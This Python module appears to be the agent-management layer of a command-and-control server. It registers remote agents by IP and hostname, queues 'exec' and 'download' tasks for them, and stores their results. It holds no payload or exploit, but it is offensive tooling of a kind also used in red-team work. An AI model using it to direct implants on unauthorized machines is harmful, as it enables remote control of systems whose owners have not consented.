from models import Agent, Result
from db import (
    insert_agent,
    delete_agent,
    get_all_agents,
    insert_task,
    get_pending_task,
    insert_result,
    delete_agent_tasks,
    mark_task_completed
)


def add_agent(agent: Agent) -> None:
    insert_agent(agent.name, agent.listener_name, agent.ip, agent.hostname)
    print(f"\nNew agent registered: {agent.name}")


def remove_agent(name: str) -> None:
    delete_agent(name)
    print(f"\nAgent '{name}' removed.")


def remove_all() -> None:
    agents = [agent["name"] for agent in get_all_agents()]
    for name in agents:
        remove_agent(name)
    print(f"\nAll agents cleared from database.")


def check_agents() -> None:
    rows = get_all_agents()
    if not rows:
        print(f"\nNo agents registered in the database.")
        return
    for row in rows:
        print(
            f"{row['name']} | {row['listener_name']} | {row['ip']} | {row['hostname']} | {row['arrived_at']}"
        )


def write_task_to_agent(name: str, command: str) -> None:
    database_agents = [agent["name"] for agent in get_all_agents()]
    if name not in database_agents:
        print(f"\nError: Agent '{name}' not found in database.")
        return
    insert_task(name, command)
    print(f"\nTask '{command}' assigned to agent '{name}'.")


def get_pending_task_to_agent(name: str):
    task = get_pending_task(name)
    return task


def get_agent_result(result: Result) -> None:
    insert_result(result.task_id, result.agent_name, result.output)
    print(
        f"\nResult received for task '{result.task_id}' from agent '{result.agent_name}'.")
    mark_task_completed(result.task_id)


def delete_tasks_from_agent(name: str):
    delete_agent_tasks(name)
    print(f"\nCleared tasks for {name}")


def quit_agent(name: str):
    write_task_to_agent(name, "quit")
    print(f"\n{name} is quitting")


def quit_all_agents():
    agents = [agent["name"] for agent in get_all_agents()]
    for name in agents:
        quit_agent(name)


def drop_file_to_agent(name: str, file: str):
    write_task_to_agent(name, f"download {file}")


def agent_exec_command(name: str, command: str):
    write_task_to_agent(name, f"exec {command}")


def check_if_agent(name: str) -> bool:
    return any(agent["name"] == name for agent in get_all_agents())